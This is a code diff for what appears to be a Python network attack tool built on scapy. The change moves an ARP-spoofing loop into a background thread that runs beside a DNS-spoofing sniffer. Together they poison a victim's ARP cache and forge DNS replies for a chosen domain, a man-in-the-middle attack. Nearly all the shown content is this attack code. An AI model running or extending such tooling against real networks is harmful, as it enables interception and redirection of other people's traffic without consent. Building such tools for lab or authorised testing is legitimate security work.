@@ -7,6 +7,7 @@ from arp_spoofing import arp_spoof
 from dns_spoofing import dns_spoof
 import threading
 import scapy.all as sc
+import time
 
 
 def print_title():
@@ -65,25 +66,28 @@ def handle_command(cmd):
         target_domain = target_domain.encode()
         print("[*] Spoofing %s (MAC: %s) as %s and DNS spoofing %s ... Press Ctrl+C to stop." % (ip, mac, ipToSpoof, target_domain))
 
+        def arp_spoof_loop(ip, mac, iptospoof):
+            print("[*] Spoofing %s (MAC: %s ) as %s ... Press Ctrl+C to stop." % (ip, mac, iptospoof))
+            while True:
+                arp_spoof(ip, iptospoof, mac)
+                time.sleep(2)
+
         # Start a new thread for DNS spoofing in order 
         def dns_spoof_thread():
-            print("AAAAAAAAAAAAAAAA")
             sc.sniff(
                 filter=("udp port 53 and src %s" % ip),
                 prn=lambda packet: dns_spoof(packet, ip, ipToSpoof, target_domain)
             )
+        
+        arp_thread = threading.Thread(target=arp_spoof_loop, args=(ip, mac, ipToSpoof))
+        arp_thread.daemon = True
+        arp_thread.start()
 
         dns_thread = threading.Thread(target=dns_spoof_thread)
         dns_thread.daemon = True
         dns_thread.start()
 
-        import time
-        try:
-            while True:
-                arp_spoof(ip, ipToSpoof, mac)
-                time.sleep(2)
-        except KeyboardInterrupt:
-            print("\n[!] Stopped spoofing.")
+        
     elif cmd == "scanif":
         scan_ifaces() # Scan available host
     elif cmd.startswith("scan"):
